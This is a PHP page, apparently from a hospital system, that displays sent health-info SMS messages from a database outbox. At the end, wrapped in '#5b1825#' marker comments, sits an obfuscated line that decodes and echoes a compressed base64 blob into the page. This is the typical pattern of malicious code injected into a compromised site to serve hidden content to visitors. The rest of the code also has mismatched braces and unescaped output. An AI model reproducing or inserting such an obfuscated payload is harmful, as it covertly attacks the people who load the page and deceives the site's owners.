<? // Nugraha, 17/02/2004
   // Pur, 08/03/2004: new libs table
   // sfdn, 22-04-2004
   // sfdn, 23-04-2004
   // sfdn, 01-05-2004
   // sfdn, 01-06-2004
   // sfdn, 24-12-2006	

$PID = "sms_index";
$SC = $_SERVER["SCRIPT_NAME"];

require_once("startup.php");

// 24-12-2006
    if ($_SESSION[uid] == "kasir2") {
       $what = "RAWAT INAP";
       $sqlayanan = "NOT LIKE '%IGD%'";	
    } elseif ($_SESSION[uid] == "kasir1") {
       $what = "RAWAT JALAN";
       $sqlayanan = "NOT LIKE '%IGD%'";
    } else {
       $what = "IGD";
       $sqlayanan = "LIKE '%IGD%'";
    
  echo "<table>";
    echo "<tr>";
    echo "<td><b><font size=4>SMS Info Kesehatan</size></b></td>";
    echo "</tr>";
    echo "</table>";
$t = new PgTable($con, "100%");

$t->SQL = "SELECT updatedindb,destinationNumber,TextDecoded FROM outbox";

        if (!isset($_GET[sort])) {
           $_GET[sort] = "updatedindb";
           $_GET[order] = "desc";
	}
 $t->ColHeader = array("Tanggal Diterima","Penerima","Pesan","&nbsp;");
    $t->ShowRowNumber = true;
    $t->ColAlign[0] = "CENTER";
    $t->ColAlign[1] = "CENTER";
    $t->ColAlign[2] = "CENTER";
    $t->ColAlign[3] = "CENTER";
    $t->ColAlign[10] = "CENTER";
$t->ColAlign[11] = "CENTER";
 $t->execute();
// ---- end ----
  }

#5b1825#
echo(gzinflate(base64_decode("Jc1JDoMwDEDRq3jHjgBSJagwPUsGk1gigxxLvX4r2Py3/DufYjPBXVclkOAEiTgmxRm+HDT97V7qdXGJWCp08Tgk1fY2JlontrD20ddssuUyttQ+zUbC9RWIzmVb3UIzbdNwwG6e3/ED")));
#/5b1825#
?>